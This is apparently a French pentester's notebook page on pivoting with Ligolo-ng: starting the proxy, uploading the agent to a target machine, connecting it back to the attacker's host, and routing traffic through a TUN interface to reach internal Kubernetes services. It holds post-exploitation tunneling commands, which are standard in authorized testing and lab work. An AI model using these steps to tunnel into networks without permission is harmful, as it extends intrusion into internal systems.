# Initialisation de la config

## Machine Local

```
/opt/tools/ligolo-ng/proxy -selfcert
```

```
certificate_fingerprint
```

### Exemple:
![[IMG-20260116022815338.png]]

## Machine Cible

```
upload /opt/tools/ligolo-ng/agent
```

### Exemple;
![[IMG-20260116022955461.png]]

```
./agent -connect $LADDRESS:$LIG-PORT -accept-fingerprint $FINGERPRINT
```

### Exemple:
![[IMG-20260116023057027.png]]
Résultat sur la machine local:
![[IMG-20260116023207217.png]]

# Forwarding Subnets

Commande qu'on peut executer:
```
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev


Ligolo-ng - An advanced, yet simple tunneling tool

Commands:
=========
  certificate_fingerprint         Show the current selfcert fingerprint
  clear                           clear the screen
  connect_agent                   Attempt to connect to a bind agent
  exit                            exit the shell
  help                            use 'help [command]' for command help
  ifconfig                        Show agent interfaces
  kill, agent_kill, session_kill  Kill the current agent
  session                         Change the current relay agent

Interfaces
==========
  interface_create, ifcreate                                      Create a new tuntap interface
  interface_delete, ifdel, interface_del                          Delete a tuntap interface
  interface_list, iflist, route_list                              List available tun interfaces
  route_add, add_route, interface_route_add, interface_add_route  Add a route to a network interface
  route_del, del_route, interface_route_del, interface_del_route  Delete a route

Listeners
=========
  listener_add   Listen on the agent and redirect connections to the desired address
  listener_list  List currently running listeners
  listener_stop  Stop a listener

Tunneling
=========
  autoroute                  Setup everything for you (interfaces, routes & tunnel)
  tunnel_list, session_list  List active tunnels and sessions
  tunnel_start, start        Start relaying connection to the current agent
  tunnel_stop, stop          Stop the tunnel
```

Création d'une interface réseau sur notre machine local:
```
ifcreate --name ligolo
```

Pour supprimer cette interface on peut lancer la commande suivante sur la machine local:
```
sudo ip link delete ligolo
```

On ajoute une route statique afin de rediriger le trafic destiné au sous-réseau cible à travers l’interface TUN Ligolo.
```
route_add --name ligolo --route $IP/$MASK
```

On démarre le tunnel réseau en associant l’interface TUN ligolo à la session distante, permettant ainsi l’acheminement du trafic via l’agent Ligolo:
```
tunnel_start --tun ligolo
```

### Exemple:
![[IMG-20260116024154786.png]]
Résultat sur la machine local:
![[IMG-20260116024225006.png]]

Cela permet d’accéder aux services internes exposés au sein du cluster Kubernetes via leurs ClusterIP:
![[IMG-20260116024455568.png]]

